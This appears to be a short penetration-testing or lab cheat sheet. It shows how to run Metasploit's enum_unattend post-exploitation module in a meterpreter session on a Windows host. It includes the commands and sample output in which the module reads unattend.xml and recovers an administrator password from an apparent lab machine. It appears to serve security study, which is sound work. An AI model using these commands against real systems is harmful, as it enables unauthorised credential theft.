# Metasploit

- MSF Windows Gather Unattended Answer File Enumeration Post Module

```
msf > use post/windows/gather/enum_unattend

msf post(windows/gather/enum_unattend) > options

Module options (post/windows/gather/enum_unattend):

   Name     Current Setting  Required  Description 
   ----     ---------------  --------  ----------- 
   GETALL   true             yes       Collect all unattend.xml that are found
   SESSION                   yes       The session to run this module on

msf post(windows/gather/enum_unattend) > set getall <true | false>

msf post(windows/gather/enum_unattend) > set session <sessions_id>

msf post(windows/gather/enum_unattend) > run
```

- When we run the module we gathered the credentials.

```
meterpreter > run post/windows/gather/enum_unattend

[*] Reading C:\Windows\panther\unattend.xml
[+] Raw version of C:\Windows\panther\unattend.xml saved as: /root/.msf4/loot/20220529162508_default_10.10.229.49_windows.unattend_364476.txt
Unattend Credentials
====================

 Type  Domain  Username  Password     Groups
 ----  ------  --------  --------     ------
 auto          Admin     password123

[+] Unattend Credentials saved as: /root/.msf4/loot/20220529162508_default_10.10.229.49_windows.unattend_378467.txt
```